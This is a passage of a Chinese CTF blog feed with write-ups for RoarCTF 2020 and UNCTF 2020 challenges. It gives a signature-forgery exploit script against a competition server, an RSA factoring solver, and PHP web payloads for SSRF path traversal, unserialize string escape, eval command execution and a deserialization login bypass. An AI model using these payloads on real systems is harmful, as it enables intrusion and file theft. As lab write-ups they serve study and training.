pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">prefix,s</span>):</span></span><br><span class="line"><span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=<span class="number">4</span>,method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">12039102490128509125925019010000012423515617235219127649182470182570195018265927223</span></span><br><span class="line">g = <span class="number">10729072579307052184848302322451332192456229619044181105063011741516558110216720725</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2str</span>(<span class="params">data, mode=<span class="string">&quot;big&quot;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&quot;little&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(data[_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&quot;big&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(data[::-<span class="number">1</span>][_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parameter</span>(<span class="params">m</span>):</span></span><br><span class="line">    x = int2str(m, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">    a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(<span class="number">128</span>, <span class="string">&quot;\0&quot;</span>)).digest())</span><br><span class="line">    b = <span class="built_in">pow</span>(a, a, p - <span class="number">1</span>)</span><br><span class="line">    h = <span class="built_in">pow</span>(g, b, p)</span><br><span class="line">    <span class="keyword">return</span> x, y, h, b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">m, r</span>):</span></span><br><span class="line">    x, y, h, b = get_parameter(m)</span><br><span class="line">    s = (y * <span class="built_in">pow</span>(h, r, p)) % p </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">m, r, s</span>):</span></span><br><span class="line">    x, y, h, b = get_parameter(m)</span><br><span class="line">    <span class="keyword">if</span> s == ((y * <span class="built_in">pow</span>(h, r, p)) % p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;139.129.98.9&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">data = r.recvline()</span><br><span class="line">prefix, s = parse(<span class="string">&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;</span>,data)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">r.sendline(brute_force(prefix,s))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">m1 = long_to_bytes(<span class="built_in">int</span>(parse(<span class="string">&quot;Here is the frist message(64 bytes):&#123;&#125;&quot;</span>,r.recvline())[<span class="number">0</span>],<span class="number">16</span>))</span><br><span class="line">m2 = long_to_bytes(<span class="built_in">int</span>(parse(<span class="string">&quot;Here is the second message(64 bytes):&#123;&#125;&quot;</span>,r.recvline())[<span class="number">0</span>],<span class="number">16</span>))</span><br><span class="line">r1 = <span class="built_in">int</span>(parse(<span class="string">&quot;The frist message&#x27;s &#x27;r&#x27;:&#123;&#125;&quot;</span>,r.recvline())[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sage solve order q:  g^q=1(mod p) </span></span><br><span class="line">q = <span class="number">1039300813886545966418005631983853921163721828798787466771912919828750891</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(g, q, p) == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gcd(q, p-<span class="number">1</span>) == q)</span><br><span class="line"></span><br><span class="line">M1,y1,h1,b1 = get_parameter(m1)</span><br><span class="line">M2,y2,h2,b2 = get_parameter(m2)</span><br><span class="line"></span><br><span class="line">s1 = sign(m1, r1)</span><br><span class="line"></span><br><span class="line">p1 = b1*r1</span><br><span class="line">p2 = M2-M1</span><br><span class="line">p3 = p1-p2</span><br><span class="line">p4 = invert(b2,q)</span><br><span class="line">r2 = (p3*p4)%q</span><br><span class="line">s2 = sign(m2,r2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1==s2:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r1 = &#x27;</span>+<span class="built_in">str</span>(r1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r2 = &#x27;</span>+<span class="built_in">str</span>(r2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s1 = &#x27;</span>+<span class="built_in">str</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s2 = &#x27;</span>+<span class="built_in">str</span>(s2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;verify(m2,r2,s2) = &#x27;</span>+<span class="built_in">str</span>(verify(m2,r2,s2)))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please choice your options:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Please give me the (r,s) of the second message:&#x27;</span>,<span class="string">&#x27;(&#x27;</span>+<span class="built_in">str</span>(r2)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(s2)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><blockquote><p>task.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from secret import *</span><br><span class="line"></span><br><span class="line">assert(flag.decode().startswith(&#x27;flag&#123;&#x27;)) and (flag.decode().endswith(&#x27;&#125;&#x27;))</span><br><span class="line">def reverse(x):</span><br><span class="line">y = 0</span><br><span class="line">while x != 0:</span><br><span class="line">y = y*2 + x%2</span><br><span class="line">x = x // 2</span><br><span class="line">return y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">p = getStrongPrime(512)</span><br><span class="line">q = reverse(p)</span><br><span class="line">if is_prime(q):</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = 65537</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">enc = powmod(m,e,n)</span><br><span class="line">#n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889</span><br><span class="line">#enc = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745</span><br></pre></td></tr></table></figure></blockquote><p><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/">ASIS 2015 - RSASR</a>魔改， $q$ 是 $p$ 的2进制反素数（<a href="https://en.wikipedia.org/wiki/Emirp">emirp数</a>），<code>bin(q)=bin(p)[::-1]</code>。</p><p>利用回溯算法按位从最高位端向中间爆破。</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line">n = <span class="number">158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t</span>(<span class="params">a, b, k</span>):</span></span><br><span class="line"><span class="comment"># sqrt(n)有512位2进制位, 需计算高低位每边的256位</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">256</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">2</span>):</span><br><span class="line"><span class="comment"># 对两个素数因子尝试爆破未遍历的位爆破</span></span><br><span class="line">            a1 = a + i*(<span class="number">2</span>**k) + j*(<span class="number">2</span>**(<span class="number">511</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">2</span>**k) + i*(<span class="number">2</span>**(<span class="number">511</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line"><span class="comment"># 当a1和b1过大</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">2</span>**(<span class="number">511</span>-k)))*(b1+(<span class="number">2</span>**(<span class="number">511</span>-k))) &lt; n:</span><br><span class="line"><span class="comment"># 当a1和b1过小</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1)%(<span class="number">2</span>**(k+<span class="number">1</span>))) != (n%(<span class="number">2</span>**(k+<span class="number">1</span>))):</span><br><span class="line"><span class="comment"># 当a1*b1的最后k+1位（不变）与n的最后k+1位不同</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># 满足条件的(a1,b1)值，尝试继续遍历</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个素数因子有512位2进制位, 尝试可能的所有中间位</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</span><br><span class="line">    t(i*(<span class="number">2</span>**<span class="number">256</span>), i*(<span class="number">2</span>**<span class="number">256</span>), <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#output:</span></span><br><span class="line"><span class="comment">#(13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L, 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L)</span></span><br><span class="line"><span class="comment">#(11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L, 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求出 $p,q$ 值，按照RSA计算方法求出 $m$ 即为flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943</span></span><br><span class="line">q = <span class="number">13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423</span></span><br><span class="line">n = p*q</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745</span></span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#flag</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;由嘶吼主办的2020 RoarCTF线上赛，平台：&lt;a href=&quot;https://ctf.4hou.com/。&quot;&gt;https://ctf.4hou.com/。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Rank: 27&lt;/p&gt;
&lt;p&gt;赛后无环境复现，故每题未写上fl</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2020赛" scheme="https://lazzzaro.github.io/tags/2020%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020</title>
    <link href="https://lazzzaro.github.io/2020/11/14/match-UNCTF2020/"/>
    <id>https://lazzzaro.github.io/2020/11/14/match-UNCTF2020/</id>
    <published>2020-11-14T10:44:31.000Z</published>
    <updated>2020-11-30T09:06:09.861Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2020年高校联合招新赛UNCTF</p><p><strong>竞赛时间：</strong> 2020年11月07日-14日</p><p>后面几天没太看掉了下来，Rank: 23</p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/unctf\.com/&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$url</span>=file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>简单的ssrf攻击。</p><p><code>file_get_contents</code>函数，当目标请求时会判断使用的协议，如果为无法识别的协议会当做目录处理，会造成目录穿越，构造payload: <code>?url=0://unctf.com/../../../../../flag</code>拿到flag。</p><p>​    </p><h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=<span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ser</span>=filter(serialize(<span class="keyword">new</span> a(<span class="variable">$uname</span>,<span class="variable">$password</span>)));</span><br><span class="line"><span class="variable">$test</span>=unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>反序列化字符串逃逸。</p><p>先构造普通情形：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=<span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> a(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要<code>password</code>变为<code>easy</code>，且<code>challenge</code>会多4字节变<code>easychallenge</code>，构造</p><p><code>?1=challenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code></p><p>会变成</p><p><code>?1=easychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code></p><p>计算需要的<code>challenge</code>数量：$9x+29=(9+4)x$，发现 $x=7.25$ 非整数，</p><p>在payload后补足三个空格，使得 $9x+29+3=(9+4)x$，解得 $x=8$，即构造<code>uname</code>为8个<code>challenge</code>并在尾部补三个空格，payload：</p><p><code>?1=challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;%20%20%20</code></p><p>​    </p><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\(.*\)/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$data</span>, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;ByeBye hacker&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>过滤不多的RCE，<code>?a=echo `base64 flag.php` </code></p><p>​    </p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])? <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>反序列化，要构造<code>username</code>为<code>admin</code>和<code>password</code>为<code>password</code>，尝试构造array：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;</span></span><br><span class="line"><span 